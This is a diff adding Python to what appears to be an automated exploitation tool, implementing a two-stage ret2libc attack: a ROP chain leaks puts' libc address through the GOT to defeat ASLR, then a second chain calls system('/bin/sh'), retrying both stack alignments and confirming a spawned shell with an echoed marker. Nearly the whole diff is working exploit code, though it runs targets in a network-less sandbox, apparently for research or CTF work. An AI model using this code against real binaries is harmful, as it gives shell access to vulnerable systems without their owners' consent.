@@ -180,3 +180,107 @@ def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> byte
         "p.stdin.close()\n"
         "print(p.stdout.read().decode('latin-1','ignore'))\n"
     ).encode()
+
+
+# --- ret2libc WITH a runtime puts() leak -------------------------------------------------------
+def _read_until(p, deadline, quiet=0.3):
+    """Read a target's merged stdout until it stalls (a quiet gap) or exits; returns the bytes."""
+    out, last = b"", time.time()
+    while time.time() < deadline:
+        r, _, _ = select.select([p.stdout], [], [], 0.1)
+        if r:
+            chunk = os.read(p.stdout.fileno(), 4096)
+            if not chunk:
+                break
+            out += chunk
+            last = time.time()
+        elif p.poll() is not None:
+            break
+        elif out and (time.time() - last) > quiet:
+            break
+    return out
+
+
+def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
+                  puts_off, system_off, binsh_off, ret_gadget=None, base_argv=(),
+                  marker: bytes = b"LYKOS_R2L_9931", timeout: float = 8.0,
+                  mem_mb: int = 2048) -> dict:
+    """Two-stage ret2libc that defeats ASLR with a puts() info-leak, confirmed by a spawned shell.
+
+    Stage 1 (`build_leak_puts`) calls puts(puts@GOT), printing the libc address of puts as raw
+    little-endian bytes, then returns to `ret_to` so the loop reads again. `resolve_libc_base`
+    subtracts the symbol's offset to recover the libc base; stage 2 (`build_ret2system`) then calls
+    system(base+binsh_off) with the resolved system address. `system` needs a 16-byte-aligned rsp,
+    and the frame parity of the re-entered stack is environment-dependent (argv/env change it under
+    the sandbox), so stage 2's alignment (with/without a `ret` pad) is tried BOTH ways on a fresh
+    process each; stage 1's leak is left unpadded, which is the parity that reaches puts on both
+    paths -- padding it too would cascade into the return and change stage 2's parity unpredictably.
+    Success = the spawned shell echoes `marker` -- an observable a crash or a wrong address can never
+    produce. Returns {ok, base, system, leaked, align, ...}.
+    """
+    from . import rop
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+    last_leaked = None
+    # stage-2 alignment: even parity (no pad), then odd (one `ret`); one of the two is 16-aligned.
+    for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
+        # A couple of tries per parity: the leak is one process, and a rare short read on stage 1
+        # is worth a retry before ruling the parity out.
+        for _ in range(3):
+            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+            try:
+                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, cwd=exedir,
+                                     start_new_session=True, preexec_fn=preexec)
+            except Exception as e:                       # noqa: BLE001
+                return {"ok": False, "reason": f"spawn failed: {e!r}"}
+            try:
+                _read_until(p, time.time() + 0.5)        # drain the target's first prompt/banner
+                s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got, puts_plt=puts_plt,
+                                         ret_to=ret_to, ret_gadget=None)   # leak stays unpadded
+                try:
+                    p.stdin.write(s1)
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    continue
+                burst = _read_until(p, time.time() + timeout / 2)
+                raw = burst.split(b"\n", 1)[0][:6]       # puts prints the 6-byte pointer then \n
+                if len(raw) < 6:
+                    continue
+                leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
+                base = rop.resolve_libc_base(leaked, puts_off)
+                last_leaked = leaked
+                if not base:
+                    continue                             # not the pointer we assumed; retry/parity
+                system, binsh = base + system_off, base + binsh_off
+                s2 = rop.build_ret2system(offset, pop_rdi, binsh, system, 0, ret_gadget=align)
+                try:
+                    p.stdin.write(s2)
+                    p.stdin.flush()
+                    time.sleep(0.3)
+                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    break                                # stage 2 killed the process: wrong parity
+                # A spawned shell may echo after a gap under the sandbox, so wait out a longer quiet
+                # window before concluding the marker never came.
+                out = _read_until(p, time.time() + timeout, quiet=1.5)
+                if marker in out:
+                    return {"ok": True, "base": base, "system": system, "binsh": binsh,
+                            "leaked": leaked, "align": align,
+                            "output": out[:400].decode("latin-1", "ignore")}
+            finally:
+                for stream in (p.stdin, p.stdout):       # close first: no buffered flush to a dead
+                    try:                                  # pipe raising an unraisable BrokenPipe
+                        if stream is not None:
+                            stream.close()
+                    except Exception:                     # noqa: BLE001
+                        pass
+                _kill(p)
+                try:
+                    p.wait(timeout=2)
+                except Exception:                        # noqa: BLE001
+                    pass
+    return {"ok": False, "reason": "no shell confirmed (leak captured but ret2libc did not spawn a "
+                                   "shell under either stack alignment)", "leaked": last_leaked}
